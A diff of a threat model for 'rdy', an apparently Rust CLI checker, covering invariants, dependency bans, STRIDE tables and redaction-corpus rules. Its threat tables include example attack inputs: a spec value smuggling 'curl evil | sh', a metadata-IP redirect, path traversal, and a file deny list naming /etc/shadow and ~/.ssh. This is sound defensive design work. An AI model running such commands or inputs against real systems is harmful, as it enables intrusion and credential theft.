-| INV-11 | Link-local and cloud metadata addresses are refused as net check targets. | Unit test for 169.254.0.0/16, fe80::/10, fd00:ec2::254. | M1 |
-| INV-12 | Net checks never store response bodies. | Fixture server returns a body with a canary; canary absent from output. | M1 |
-| INV-13 | Kube requests are GET or LIST, or POST to SelfSubjectAccessReview, SelfSubjectRulesReview, or any POST with `dryRun=All`. Nothing touches `secrets`. | Mock API server records requests; test asserts the allowlist. | M1 |
-| INV-14 | Every string written to a report or log passes the redactor first. | Golden tests over the M1 corpus; canary secrets in env, kubeconfig and command output never appear in output or logs. | M1 |
-| INV-15 | The HTML report loads no remote resource and runs no script built from data. | Golden test with XSS payloads; CSP meta present; grep for `http` in `src`/`href` attributes other than plain links. | M1 |
-| INV-16 | Untrusted strings printed to the terminal contain no control characters. | Unit test with ANSI sequences. | M1 |
-| INV-17 | Our crates contain no `unsafe`. | `#![forbid(unsafe_code)]` check in CI. | M1 |
-| INV-18 | install.sh refuses root without `--allow-root`, refuses a bad hash, refuses a bad or missing signature (unless the insecure env var is set), and executes nothing if truncated. | Shell test suite. | M1 |
-| INV-19 | No upload without `--upload` or an interactive yes; non-TTY never uploads without the flag. | Integration test with a fake server counting requests. | M2 |
-| INV-20 | Upload sends exactly the bytes on disk and writes a receipt with matching digests. | Fake server compares digests. | M2 |
-
-## What a Fortune 100 security reviewer will ask
-
-| Question | Answer | When true |
+| Id | Invariant | Test |
 |---|---|---|
-| What does it do on my host? | Reads `/proc`, `/sys` and a short list of files, runs a short list of commands without a shell, connects to endpoints in the spec. The JSON result has the full action log. | M1 (`--plan` preview in M2) |
-| Does it need root? | No. It runs as any user and reports what it could not check. It never asks for sudo. | M1 |
-| Does it phone home? | No. No telemetry, no update check. Upload is a separate explicit command. Tested in a network namespace. | M1 |
-| What can a malicious spec do? | The bounded sentence at the top of this document. | M1 |
-| Can a spec run arbitrary commands? | No. Custom script checks are not in M1; when they come they are off unless `--allow-exec`. | M1 |
-| What does it do with cluster-admin? | Read-only verbs plus access reviews and dry-run. It never reads Secrets. We ship a read-only ClusterRole so you do not need cluster-admin at all. | M1 |
-| How do I verify the binary? | cosign keyless signature bound to our release workflow, SHA-256 sums, SBOM, and `cargo audit bin rdy` reads the dependency list embedded by cargo-auditable. | M1 |
-| How do I know the spec came from my vendor? | You pin the vendor's public key from their own site. Unsigned or unknown-key specs are refused. | M1 |
-| What is in the report and who can read it? | Field list on the docs security page. Files are 0600 in a 0700 dir. Secrets are redacted before write. | M1 |
-| What leaves the machine? | Nothing by default. Upload shows files, sizes and destination first, sends the exact bytes, and writes a receipt. The upload client is open source. | M2 |
-| Is it memory safe? | Rust, no `unsafe` in our crates, dependencies reviewed with cargo-deny and audited daily. | M1 |
-| Reproducible builds? | A goal. Deviations documented. Verification job in M3. | M3 |
-| FIPS? | Not in M1. The rustls crypto provider choice decides the path (ADR). | Later |
-| Third-party audit? | Planned before the Enterprise tier, budget $15k to $25k. Until then this threat model is public. | M5 |
-| How do I report a vulnerability? | SECURITY.md: GitHub private reporting or security@getrdy.io, 3 business day acknowledgement, 90-day disclosure. | M1 |
-| Is the portal SOC 2? | Not yet. Roadmap on the Trust page. The CLI works fully without the portal. | Later |
-
-## SECURITY.md and disclosure process
-
-`SECURITY.md` at the repo root is written. The process behind it:
-
-1. Channels: GitHub private vulnerability reporting on `getrdy-io/rdy` (preferred), or
-   security@getrdy.io. PGP key to be published. `/.well-known/security.txt` on getrdy.io points to both.
-2. Scope: the `rdy` binary, the public crates, install.sh, release artifacts and the release pipeline.
-   app.getrdy.io joins scope when the portal launches.
-3. Acknowledge within 3 business days. Triage and severity (CVSS 4.0) within 7 days.
-4. Fix in a private fork via a GitHub security advisory. Target: critical 14 days, high 30, others 90.
-5. Coordinated disclosure at fix release or 90 days, whichever is first. Extension by mutual agreement.
-6. Publish a GHSA, request a CVE through GitHub, add a RUSTSEC entry for affected public crates, note it
-   in CHANGELOG, credit the reporter unless they decline.
-7. Supported versions: the latest minor release only while pre-1.0.
-8. Safe harbor for good-faith research. No bug bounty yet.
-
-Realism note: one part-time maintainer. The timelines above are what one person can keep. Do not shorten
-them in marketing copy.
+| INV-01 | No spec byte reaches the YAML parser before verification succeeds, except under `--allow-unsigned` or `rdy spec lint`. | Parser spy: a tampered spec is never parsed. |
+| INV-02 | Spec (1 MiB), `.minisig` (4 KiB) and `trust.yaml` (256 KiB) are read through `take(limit + 1)`. Oversize exits 64. | Oversize files, a FIFO and `/dev/zero` each exit 64 within 1 s. |
+| INV-03 | A spec verifies only if its key id is pinned for the trusted-comment product and `metadata.product` matches. | Unpinned id gives "unknown key"; a key pinned for A fails on B; a comment and metadata mismatch fails. |
+| INV-04 | With euid 0, only the system store is read, and it is refused unless root-owned, not group or world writable, and not a symlink. | Run under `sudo` in CI with `HOME` and `XDG_CONFIG_HOME` set to a user dir holding a pin; the pin is ignored. Bad owner, mode and symlink cases exit 64. |
+| INV-05 | `--allow-unsigned` is read from argv only. `RDY_ALLOW_UNSIGNED=1` and an `allow_unsigned` config key have no effect. An unsigned run says `signature: unsigned` in JSON and HTML. A signature failure without the flag exits 64. | Integration tests and golden output. |
+| INV-06 | Duplicate keys, anchors, aliases, merge keys, multi-document input and unknown top-level keys exit 64. Unknown check ids and unknown per-check fields become `Skipped` ("needs a newer rdy"), run no code, and cap the verdict at Warnings. | Fixtures, including the plan's example with `gpu.cuda` and `aws.iam`. |
+| INV-07 | In workspace crates, `std::process::Command`, `tokio::process::Command`, `std::net::TcpStream`, `tokio::net::TcpStream`, `std::fs::write` and `std::fs::File::create` compile only in the facade modules (`clippy.toml` disallowed lists, `#[allow]` only there). Dependency-created sockets come only from the mediated clients. The one named exception is kube exec plugins, recorded in the action log. | `cargo clippy -D warnings` in CI; an action-log completeness test over the fixture run. |
+| INV-08 | No shell receives spec-derived input. Unix root runs resolve programs from the fixed PATH. Windows runs use absolute System32 paths. `sudo`, `su`, `doas`, `pkexec` are never executed. | Command runner unit tests; a test that every program name is a source constant. |
+| INV-09 | Report files are written only inside one new output dir (Unix 0700 and 0600, `create_new`, no symlink following, temp plus rename). The only other write is `trust.yaml`, on an explicit pin. | Pre-planted symlink, existing file and mode tests; a test that `rdy run` without a pin touches no path outside the output dir. |
+| INV-10 | `rdy` exits 70 if uid differs from euid, gid from egid, or (Linux) `CapEff` is nonzero for a non-root uid. Not applicable on Windows. | Unit test with injected ids and a recorded `/proc/self/status`. |
+| INV-11 | Network peers are only: spec endpoints and their redirect hops (max 5), spec `ntp_servers`, the configured proxy, system resolvers (queries for spec hostnames only), and the selected API server. The kube exec plugin is the named exception, logged. | Linux CI: the fixture suite runs under `sudo unshare -n` (loopback only, fixture DNS and servers on loopback) inside `strace -f -e trace=connect,sendto,sendmsg`. Every destination must be a loopback fixture address. `sudo` is used because Ubuntu 24.04 runners block unprivileged user namespaces. |
+| INV-12 | Every connect, including redirect hops, refuses resolved or literal addresses in 169.254.0.0/16, fe80::/10, fd00:ec2::254 and IPv4-mapped forms. Through a proxy, only the CONNECT hostname can be checked. | Fixture DNS resolving to each address, `::ffff:169.254.169.254`, and a redirect to the metadata IP. |
+| INV-13 | Net checks keep status, a fixed list of headers, timing and certificate metadata. They read at most 64 KiB of body and discard it. | A body canary never appears in the output. |
+| INV-14 | The kube client sends only allowlisted requests (section above). Anything else fails closed in the tower layer. | The guard rejects a DELETE, a POST to `pods` and a GET on `secrets`; the mock server records only allowed requests across the fixture run. |
+| INV-15 | Every string field of the result and every log line passes the redactor first. | Canary secrets in env, proxy URL, kubeconfig and command output never appear in JSON, HTML or stderr at `RUST_LOG=trace`. |
+| INV-16 | The HTML report has the ADR 0003 CSP, loads no remote resource, and embeds JSON with `<`, `>` and `&` escaped as `\u003c`, `\u003e` and `\u0026`. | Golden test with script payloads; a headless render with no network requests. |
+| INV-17 | Untrusted strings printed to the terminal contain no control characters. | Unit test with ANSI sequences. |
+| INV-18 | `unsafe_code = "forbid"` in `[workspace.lints]`. One named FFI module has a `deny` override, every block has a `// SAFETY:` comment, and CI keeps an allowlist of such files. | CI fails on a new file with `unsafe`. |
+| INV-19 | `install.sh` behaves as 06's contract table says, plus the hash rule above. | 06's install.sh tamper tests, with wrong-identity, truncation, no-hash-tool and no-matching-line cases. |
+| INV-20 | (M2) No upload without the flag or a yes. Exact bytes are sent, and digests match the receipt. | Fake server tests (SEC-41). |
 
 ## Dependency policy
 
-Rules:
+The real `deny.toml` lands with 06's "CI lint and deny job" ticket. Rules it must encode:
 
-- crates.io only. No git or path dependencies outside the workspace.
-- `Cargo.lock` committed. CI and release builds use `--locked`.
-- Every new direct dependency needs security-reviewer approval. The PR states: purpose, why std is not
-  enough, maintainers, downloads, `unsafe` use, `build.rs` or proc-macro, license.
-- Prefer fewer crates. Turn off default features and enable what we use.
-- An advisory ignore must name a ticket and an expiry date no more than 90 days out.
+- crates.io only. No git sources. `Cargo.lock` committed, `--locked` everywhere.
+- Bans: `openssl`, `openssl-sys`, `native-tls`, `hyper-tls`, `tokio-native-tls`, `aws-lc-sys` and
+  `aws-lc-rs` (ADR 0009), `serde_yaml`, `serde_yml` (RUSTSEC-2025-0068), `libyml` (RUSTSEC-2025-0067),
+  `atty` (unmaintained RUSTSEC-2024-0375, unsound RUSTSEC-2021-0145). Wildcards denied, with
+  `allow-wildcard-paths = true`.
+- Licenses allowed: Apache-2.0, MIT, BSD-2-Clause, BSD-3-Clause, ISC, Zlib, Unicode-3.0, CC0-1.0, BSL-1.0,
+  CDLA-Permissive-2.0. MPL-2.0 only as a reviewed per-crate exception. Never GPL, LGPL, AGPL, SSPL, BUSL
+  or unknown.
+- Advisories: the PR gate uses `unmaintained = "workspace"`. The daily audit uses `"all"` and opens an
+  issue instead of blocking. An ignore names a ticket and expires within 90 days.
+- A new direct dependency needs security-reviewer approval: purpose, maintainers, `unsafe`, `build.rs`,
+  license.
 
-Audit cadence:
+## SECURITY.md
 
-| When | What |
-|---|---|
-| Every PR | `cargo deny check` (advisories, bans, licenses, sources). |
-| Daily | `audit.yml` runs `cargo deny check advisories` and `cargo audit`; opens or updates a `security` issue. |
-| Weekly | Dependabot PRs for cargo and GitHub Actions (SHA pins), grouped. |
-| Every release | `cargo audit bin` on the built binaries; CycloneDX SBOM attached; dependency count in release notes. |
-| Quarterly | Review duplicates, unmaintained crates, crates with build scripts, ownership changes. |
+`SECURITY.md` at the repo root covers versions, scope, reporting, timelines and safe harbor.
 
-`deny.toml` starting point (release-engineer confirms key names against the pinned cargo-deny version):
+## Appendix A: Surface 1 STRIDE
 
-```toml
-[graph]
-targets = [
-  "x86_64-unknown-linux-musl", "aarch64-unknown-linux-musl",
-  "x86_64-apple-darwin", "aarch64-apple-darwin", "x86_64-pc-windows-msvc",
-]
-all-features = true
+| # | Threat | Example | L | I | Mitigation | Ticket |
+|---|---|---|---|---|---|---|
+| S1 | Wrong cluster or identity | `KUBECONFIG` points at prod | M | M | `[M1]` Show context, server and user (from SelfSubjectReview) before the first call and in the report. | SEC-24 |
+| S2 | Program hijack | A fake `getenforce` early in root's PATH; a planted `powershell.exe` next to `rdy.exe` | M | H | `[M1]` Unix: as root, programs resolve from `/usr/sbin:/usr/bin:/sbin:/bin`. Windows: absolute `%SystemRoot%\System32` paths. Cleared env plus allowlist (ADR 0004). | fold: command runner |
+| T1 | Write outside output dir | A pre-planted symlink in a shared dir; `metadata.product: ../../etc/cron.d/x` | M | H | `[M1]` Slug-validated product. A new dir, `create_new` files, no symlink following, temp plus rename. | SEC-19 |
+| T2 | Spec input reaches a shell | Spec value `"/x; curl evil \| sh"` | L | H | `[M1]` Argv only. No shell gets spec-derived input. Windows PowerShell strings are source constants. | fold: command runner |
+| T3 | Markup in the HTML report | Proxy cert subject or node name carries `<script>` | M | M | `[M1]` askama autoescape, no `safe`, CSP `default-src 'none'; style-src 'unsafe-inline'; img-src data:` (ADR 0003), embedded JSON escaped as `\u003c`, `\u003e`, `\u0026`. | fold: embed JSON |
+| T4 | Terminal escape injection | Banner with ANSI sequences | M | L | `[M1]` Escape control characters in untrusted strings. | fold: error types |
+| R1 | "What did it do on my box?" | No record after the run | M | M | `[M1]` Action log in the result. `[M2+]` `rdy run --plan`. | SEC-17, SEC-40 |
+| I1 | Secrets in the report | `HTTPS_PROXY=http://svc:pa55@proxy:3128` echoed as evidence; a reqwest error carrying a URL | H | H | `[M1]` Every string field passes the redactor before write. | SEC-25, SEC-26 |
+| I2 | Secrets in logs | `RUST_LOG=trace` makes a dependency print a header | M | H | `[M1]` A redacting log layer always. Default caps on hyper, h2, rustls and kube apply only when `RUST_LOG` is unset. | SEC-25 |
+| I3 | Report readable by others | Report in `/tmp`, or in `C:\temp`, which inherits the folder ACL | M | M | `[M1]` Unix 0700 and 0600. Windows: default dir under the user profile; ACLs are a residual risk. | SEC-19 |
+| I4 | Kubernetes secret material | LIST `secrets`; a full pod LIST returns literal env values | L | H | `[M1]` Guard forbids `secrets`. Pod specs are used in memory for request sums and never stored. | fold: kube guard |
+| I5 | Root reads private files | A check walks `/proc/*` and reads `environ` | M | H | `[M1]` `fs` denylist: `/proc/<pid>/environ` and `mem`, `/etc/shadow`, `~/.ssh/*`, private key files. `cmdline` is matched, never stored. | SEC-17 |
+| I6 | Phone home | Telemetry or update check | L | H | `[M1]` None exists. strace contact-set test. | SEC-22 |
+| I7 | Internal recon or metadata theft via spec | Endpoint or redirect to `169.254.169.254` | M | M | `[M1]` Address policy on every connect, including redirect hops (max 5). No bodies stored. | SEC-21 |
+| D1 | Production impact | Bandwidth sample saturates a link; 5 MiB command output | M | M | `[M1]` Per-check timeouts (ADR 0004), capped output, capped bandwidth sample (03). | fold: command runner |
+| E1 | Cluster mutation | A bug sends a write with cluster-admin | L | H | `[M1]` Runtime tower guard on the kube client (below). | fold: kube guard |
+| E2 | Privilege-carrying install | `rdy` installed setuid, setgid or with file capabilities | L | H | `[M1]` Exit 70 if uid differs from euid, gid from egid, or (Linux) `CapEff` is nonzero for a non-root uid. | fold: Check trait |
+| E3 | Self-escalation | `rdy` calls `sudo` | L | H | `[M1]` `sudo`, `su`, `doas`, `pkexec` are refused. Root-only checks report Skipped. | fold: command runner |
+| E4 | Memory corruption from crafted input | Crafted spec, command output, HTTP response | L | H | `[M1]` Workspace `unsafe_code = "forbid"`, one named FFI module. `[M2+]` fuzzing. | fold: workspace skeleton, SEC-45 |
+| E5 | kubeconfig exec plugin | `aws eks get-token` runs with the user's env | L | H | `[M1]` Named exception (ADR 0010 decision 5). kubeconfig only from `--kubeconfig`, `KUBECONFIG` or the default path. The report names the binary run. | SEC-24 |
 
-[advisories]
-version = 2
-yanked = "deny"
-unmaintained = "all"
-unsound = "all"
-ignore = [
-  # { id = "RUSTSEC-YYYY-NNNN", reason = "SEC-nn, expires YYYY-MM-DD" },
-]
+## Appendix B: Surface 2 STRIDE
 
-[licenses]
-version = 2
-confidence-threshold = 0.93
-allow = [
-  "Apache-2.0", "Apache-2.0 WITH LLVM-exception", "MIT", "BSD-2-Clause", "BSD-3-Clause",
-  "ISC", "Zlib", "Unicode-3.0", "CC0-1.0", "BSL-1.0", "CDLA-Permissive-2.0",
-]
-# MPL-2.0 and OpenSSL (for example aws-lc-sys) only as reviewed per-crate exceptions.
-exceptions = []
+| # | Threat | Example | L | I | Mitigation | Ticket |
+|---|---|---|---|---|---|---|
+| S1 | Impersonated vendor | Attacker signs with their own key and emails "acme-platform" | M | M | `[M1]` Unpinned key id means refuse. Output shows the fingerprint and the local pin note, never a name from the spec. | fold: verify minisign |
+| S2 | Planted trust | A local user pins a key that a root run then trusts | M | H | `[M1]` Requirement 3. | fold: trust store |
+| S3 | Self-certifying delivery (M2) | Portal serves the spec and its key on one channel | M | H | `[M2+]` Explicit pin on first use; a key change for a pinned product is a hard failure (ADR review SF-03). | SEC-47 |
+| T1 | Tampered in transit | `min: 32Gi` edited to `min: 1Gi` | M | M | `[M1]` Verify raw bytes before parsing. | fold: verify minisign |
+| T2 | Signature stripping plus a nudge | "Just add `--allow-unsigned`" | M | M | `[M1]` argv only, red banner, `signature: unsigned` in JSON and HTML, hints never suggest the flag. `[M2+]` TTY confirmation (cli-ux). | fold: rdy verify |
+| T3 | Parser differential | Duplicate keys or a second YAML document | L | H | `[M1]` One document; duplicate keys, anchors, aliases and merge keys rejected (ADR 0001). | fold: wire serde-saphyr |
+| T4 | Rollback | Replay an older signed spec | L | L | `[M1]` Report shows `signed_at` and spec digest. `[M2+]` portal serves latest. | SEC-46 |
+| R1 | Dispute over which spec ran | "We never sent that" | L | M | `[M1]` Result records spec sha256, key id and product. | fold: verify minisign |
+| I1 | Vendor key leak | Secret key committed or printed | M | H | `[M1]` Encrypted by default, `create_new` 0600, `spec sign` refuses readable key files, secrets never printed. | fold: keygen and sign |
+| D1 | Parser exhaustion | Billion laughs, deep nesting, `/dev/zero` as the spec | M | L | `[M1]` Bounded reads, ADR 0001 limits; mostly unreachable once INV-01 holds. | fold: wire serde-saphyr |
+| E1 | Capability creep | Unknown check id, exec block | M | H | `[M1]` Unknown check ids and fields become Skipped, and no code runs for them (ADR 0005, 0007). Unknown top-level keys exit 64. No exec in M1. | fold: unknown ids |
 
-[bans]
-multiple-versions = "warn"
-wildcards = "deny"
-deny = [
-  { crate = "openssl", reason = "rustls only, CLAUDE.md rule 5" },
-  { crate = "openssl-sys", reason = "rustls only" },
-  { crate = "native-tls", reason = "rustls only" },
-  { crate = "hyper-tls", reason = "rustls only" },
-  { crate = "tokio-native-tls", reason = "rustls only" },
-  { crate = "atty", reason = "unmaintained, RUSTSEC-2021-0145; use std::io::IsTerminal" },
-  { crate = "serde_yml", reason = "RUSTSEC-2025-0068, unsound, no fix" },
-  { crate = "libyml", reason = "RUSTSEC-2025-0067" },
-  { crate = "serde_yaml", reason = "archived by its author; parser choice goes through an ADR" },
-]
+## Appendix C: Surface 3 STRIDE
 
-[sources]
-unknown-registry = "deny"
-unknown-git = "deny"
-allow-registry = ["https://github.com/rust-lang/crates.io-index"]
-```
+| # | Threat | Example | L | I | Mitigation | Ticket |
+|---|---|---|---|---|---|---|
+| S1 | Typosquat crate or domain | `cargo install rdy-cli` installs a squatter | M | H | `[M1]` Reserve names, including an `rdy-cli` placeholder (ADR review SF-12). | 06 reserve names |
+| S2 | Wrong signer identity | A fork's workflow signs a build | M | H | `[M1]` Exact identity and issuer per 06. | 06 sign-release |
+| T1 | getrdy.io serves a bad script | Registrar or Cloudflare takeover, DNS hijack | L | H | `[M1]` Hardware key or passkey MFA, registrar lock, DNSSEC, CAA, HSTS. `install.sh` is in `SHA256SUMS`. Verify-first docs. | SEC-05, SEC-31 |
+| T2 | Truncated script runs | Connection drops | L | M | `[M1]` `main()` guard (06). | 06 install.sh core |
+| T3 | Asset swapped after publish | Stolen token re-uploads | L | H | `[M1]` Signature check; immutable releases if the sandbox proof passes. | 06 sign-release |
+| T4 | Compromised Action | Retargeted tag, as with `tj-actions/changed-files` in March 2025 | M | H | `[M1]` SHA pins, zizmor, minimal `permissions`, `id-token: write` only in sign-release. | 06 CI lint, rulesets |
+| T5 | Malicious dependency | `build.rs` payload | M | H | `[M1]` Lockfile, `--locked`, crates.io only, cargo-deny, new-dependency review. | 06 CI lint |
+| R1 | Unattributable release | "Who published this?" | L | M | `[M1]` Rekor entry, tag rulesets, audit log. | 06 sign-release |
+| I1 | Long-lived secrets leak | Token in a CI log | L | M | `[M1]` Keyless signing. `[M2+]` crates.io trusted publishing. | 06 |
+| E1 | Installer as root | `sudo sh` | M | M | `[M1]` Refuses uid 0 without `--allow-root`; never sudo (06). | 06 install.sh core |
+| E2 | Maintainer takeover | Attacker pushes a tag | L | H | `[M1]` MFA, tag ruleset, manual approval on `release`. | SEC-04, 06 rulesets |
 
-Denied licenses, never as exceptions: GPL, LGPL (a static musl binary makes relinking impractical),
-AGPL, SSPL, BUSL, Commons Clause, and anything unlicensed or unknown.
+## Appendix D: Surface 4 STRIDE (M2)
 
-## Redaction corpus requirements (handed to 04-bundle-and-redaction.md)
+| # | Threat | Example | L | I | Mitigation | Ticket |
+|---|---|---|---|---|---|---|
+| S1 | Fake portal | Pasted command adds `--server https://app.getrdy-io.example` | M | H | Fixed default server; any other is shown in the prompt and receipt. | SEC-41 |
+| S2 | Stolen token posts fake results | Poisoned vendor dashboard | M | M | Write-only, per link, expiring, revocable, rate limited; results labelled customer-reported. | SEC-42 |
+| T1 | Body altered in transit | Intercepting proxy edits it | L | M | TLS; per-file digests verified by the server and echoed in the receipt. | SEC-41 |
+| T2 | Server drives the client | Response asks for more data | L | H | Only a receipt id and a URL are read. | SEC-41 |
+| R1 | Customer cannot prove what left | Dispute | M | M | Exact on-disk bytes plus the receipt. | SEC-41 |
+| I1 | Upload without consent | Default sends data | L | H | Flag or yes only; non-TTY never prompts. | SEC-41 |
+| I2 | Unredacted data leaves | File outside the output dir | M | H | Manifest-listed files only, redacted before write. | SEC-41, SEC-44 |
+| I3 | Token leaks | argv, shell history, proxy logs | H | M | Env, file or prompt; header only; prefix the redactor catches. | SEC-41, SEC-42 |
+| I4 | Cross-tenant leak | One vendor sees another's results | L | H | rdy-cloud's own threat model, before the M2 beta. | none here |
+| D1 | Oversized upload | 5 GB bundle, retry storm | L | L | Size caps, bounded retries. | SEC-41 |
+| E1 | Token grants more than upload | Reads results | L | H | Write-only scope enforced server side. | SEC-42 |
 
-The corpus is the test suite for "redaction before write". It is owned by security-reviewer and
-qa-engineer. M1 needs a subset for reports and logs. M2 needs the full set for bundles.
+## Appendix E: what a customer security reviewer will ask
 
-Layout and format:
-
-- `tests/fixtures/redaction/<category>/<case>.in` with `<case>.expected` next to it, plus a
-  `<case>.toml` naming the category, the redactor rule ids that must fire, and whether the case is a
-  positive (must redact) or negative (must not touch).
-- Replacement format is stable and typed, for example `[REDACTED:aws_access_key_id]`, so golden files
-  are readable and reviewers can see which rule fired.
-- Every value is synthetic. Use vendor-documented example values where they exist (for example
-  `AKIAIOSFODNN7EXAMPLE`). For formats that GitHub push protection blocks, build the value at test time
-  from parts so the repo never holds a scannable token.
-
-Categories, M1 subset first:
-
-| Category | M1 | Examples of cases |
+| Question | Answer | When |
 |---|---|---|
-| URL userinfo | yes | proxy env vars, `git` remotes, JDBC and Postgres URLs, percent-encoded passwords |
-| Bearer and basic auth | yes | `Authorization:` headers, curl `-H` lines, `Basic` base64 |
-| AWS keys | yes | access key ids, secret keys after `=` or `:`, session tokens |
-| PEM private keys | yes | RSA, EC, OpenSSH, PKCS#8, encrypted, CRLF line endings |
-| Kubeconfig credentials | yes | `token:`, `client-key-data:`, `password:`, exec env values |
-| rdy tokens | yes | `rdy_st_` prefix in argv, env and logs |
-| Generic secrets by key name | yes | `password=`, `secret:`, `api_key` in env, YAML, JSON, INI |
-| Emails | M2 | in logs and config |
-| JWTs, GitHub, GitLab, Slack, Stripe tokens | M2 | prefixes and shapes |
-| GCP and Azure credentials | M2 | service account JSON, connection strings |
-| Custom spec patterns | M2 | vendor-supplied regex |
+| What does it do on my host? | Reads `/proc`, `/sys` and named files, runs fixed commands, talks to the INV-11 peers. The action log lists it all. | M1 (`--plan` M2) |
+| Does it need root? | No. It reports what it could not check and never asks for sudo. | M1 |
+| Does it phone home? | No telemetry and no update check. Tested under strace with no network. | M1 |
+| What can a malicious spec do? | The bounded sentence. | M1 |
+| What does it do with cluster-admin? | Reads, plus three self-review POSTs, enforced at runtime. Never Secrets. A read-only ClusterRole ships, so you do not need cluster-admin. | M1 |
+| How do I verify the binary? | `scripts/verify-release.sh`: cosign keyless bound to `sign-release.yml`, SHA256SUMS, SBOM, `cargo audit bin`. | M1 |
+| How do I know the spec is my vendor's? | You pin the vendor's minisign key for that product. Unpinned or tampered specs are refused. | M1 |
+| What is in the report? | Field list on the docs security page. 0600 files, redacted before write. | M1 |
+| What leaves the machine? | Nothing by default. Upload shows files and destination first and keeps a receipt. | M2 |
+| Is it memory safe? | Rust, `unsafe` forbidden outside one documented FFI module, dependencies gated by cargo-deny. | M1 |
+| Third-party audit? | Before the Enterprise tier. This threat model is public until then. | M5 |
+| How do I report a bug? | SECURITY.md. | M1 |
 
-Hostile cases every category needs:
+## Appendix F: redaction corpus requirements (for 04)
 
-- The secret split across a streaming chunk boundary. Redaction runs on streams in M2, so the corpus
-  must test at every offset within the longest pattern length.
-- Encodings: JSON-escaped, URL-encoded, inside quotes, YAML block scalars, multi-line values.
-- Context: journald lines, Kubernetes events, env dumps, command output with ANSI codes.
-- Near misses that must not be redacted (negatives): git SHAs, UUIDs, base64 image data, version strings.
-- Unicode lookalikes and zero-width characters around key names.
-
-Quality bars:
-
-- 100 percent of positive cases redacted. A single miss fails CI.
-- False positives tracked per category as a number in the test output, not gated in M1.
-- Every bug report about a missed secret adds a case before the fix lands.
-- Size: at least 60 cases in M1, at least 300 by the end of M2.
+- Layout: `tests/fixtures/redaction/<category>/<case>.in`, `.expected` and `.toml` (category, rules that
+  must fire, positive or negative). Replacements are typed, for example `[REDACTED:aws_access_key_id]`.
+- All values are synthetic. Use vendor-documented examples (`AKIAIOSFODNN7EXAMPLE`). Build values that
+  push protection would block at test time, from parts.
+- M1 categories: URL userinfo, bearer and basic auth, AWS keys, PEM private keys, kubeconfig credentials,
+  `rdy_st_` tokens, secrets by key name in env, YAML, JSON and INI. M2 adds emails, JWTs, common SaaS
+  token prefixes, GCP and Azure credentials, and custom spec patterns.
+- Hostile cases: JSON-escaped, URL-encoded, quoted, multi-line and ANSI-wrapped values; negatives (git
+  SHAs, UUIDs, base64 images, versions); Unicode lookalikes near key names. Chunk-boundary cases at every
+  offset are M2, when redaction streams.
+- Bars: zero misses on positives fails CI on any miss. False positives are counted, not gated, in M1.
+  Every missed-secret report adds a case before the fix. 60 cases in M1, 300 by the end of M2.
 
 ## Plan corrections found
 
-- `docs/plan/rdy-plan.md`, Website plan, Stack: says the install endpoint is `get.<domain>`. CLAUDE.md
-  and the Name table say `getrdy.io/install`. Fix: one URL, `https://getrdy.io/install`; drop `get.`
-  or make it a redirect only.
-- `docs/plan/rdy-plan.md`, Release engineering: "Binaries and specs signed with Sigstore (cosign)".
-  CLAUDE.md rule 3 says specs are signed with the vendor's ed25519 key. Fix: binaries with cosign
-  keyless; specs with the vendor's ed25519 key.
-- `docs/plan/rdy-plan.md`, How a POC flows, step 1: `rdy run acme-platform --token abc123`. The token on
-  argv leaks into `ps`, shell history and CI logs, and resolving a spec by name over the network is M2.
-  Fix: M1 flow is `rdy run ./acme-platform.yaml --trusted-key acme.pub`; M2 takes the token from
-  `RDY_TOKEN`, `--token-file` or a prompt.
-- CLAUDE.md, Names and places, and the plan's install line: `curl -sSf https://getrdy.io/install | sh`.
-  Fix: `curl --proto '=https' --tlsv1.2 -sSf https://getrdy.io/install | sh`, plus a documented
-  verify-first path.
-- `docs/plan/rdy-plan.md`, crate table: `serde_yaml` was archived by its author in 2024, and the
-  `serde_yml` fork has RUSTSEC-2025-0068 (unsound, no patched version). Fix: rust-architect picks a
-  maintained parser in an ADR (candidates include `serde_yaml_ng` and `serde-saphyr`). The SEC-15 limits
-  apply whichever is picked.
-- `docs/plan/rdy-plan.md`, crate table lists `self_update`; CLAUDE.md lists a `self-update` command.
-  Self-update is network plus binary replacement and is not in M1 scope. Fix: M3, SEC-49, same cosign
-  verification as install.sh, never automatic.
-- CLAUDE.md rule 2 ("Redaction runs before anything is written to disk") already binds M1 reports, but
-  redactors live in `rdy-bundle`, which the plan schedules for M2. Fix: a minimal redaction core ships in
-  M1 (SEC-25). Placement is an ADR.
-- `docs/plan/rdy-plan.md`, Check families at launch: "Custom: a shell or script check ... sandboxed".
-  Sandboxing scripts on four OSes is large and breaks the bounded-blast-radius promise. Fix: M4 or later,
-  off unless `--allow-exec`, with its own threat model (SEC-53).
-- `docs/plan/rdy-plan.md`, Example spec: `file:/etc/acme/*.yaml` implies arbitrary root file globs.
-  Fix: 04-bundle-and-redaction.md defines a path policy with a deny list (`/etc/shadow`, `~/.ssh`, key
-  files) and shows the resolved file list before collection.
-- `docs/plan/rdy-plan.md`, Conversion flow, item 4: report links carry the vendor name to track
-  click-through. Fix: state that these are click-only links, never auto-loaded images or beacons, and
-  list the parameters on the docs security page.
-- CLAUDE.md, rule 5 "rustls everywhere": underspecified for corporate TLS interception. With only bundled
-  web roots, net checks and upload fail behind the proxies our users sit behind. Fix: use the platform
-  trust store (`rustls-platform-verifier` or `rustls-native-certs`) and report interception as a finding.
-- `docs/plan/rdy-plan.md`, crate table names the binary crate `rdy-cli`. CLAUDE.md says the crate is
-  `rdy` in `crates/rdy-cli`. Fix: say so in the plan, and reserve `rdy-cli` on crates.io as a
-  typosquat guard (SEC-11).
-- `docs/plan/rdy-plan.md`, Release engineering: "the install script verifies checksums and signatures"
-  does not say what happens when cosign is missing, which is the common case. Fix: the ADR below.
+- ADR 0010 decision 4 vs 03 `k8s.admission`: ADR 0010 allows no non-GET except review kinds, and 03 adds
+  a dry-run pod create. Fix: the M1 guard rejects it. 03 moves `dry_run` to M2 behind an ADR 0010
+  amendment.
+- ADR 0010 uses `--kube-context`, while 03 and this document use `--context`. Fix: cli-ux decides in 07;
+  proposal `--context`.
+- ADR 0011 decision 5 publishes no `rdy-cli` package, while 06 reserves names. Fix: reserve a placeholder
+  that points to `rdy` (ADR review SF-12).
+- ADR 0001 line 15 calls RUSTSEC-2025-0068 "unsound libyml". 0068 is `serde_yml`; 0067 is `libyml`.
+- `docs/plan/rdy-plan.md` still names competitors in several tables and the Sources list. The founder's
+  rule covers the whole repo. Fix: the plan owner scrubs it.
+- The first draft's other corrections (install URL, cosign vs vendor keys, token on argv, curl flags,
+  `serde_yaml`, `self_update`, M1 redaction, `custom.exec` milestone, file globs, report link) are now
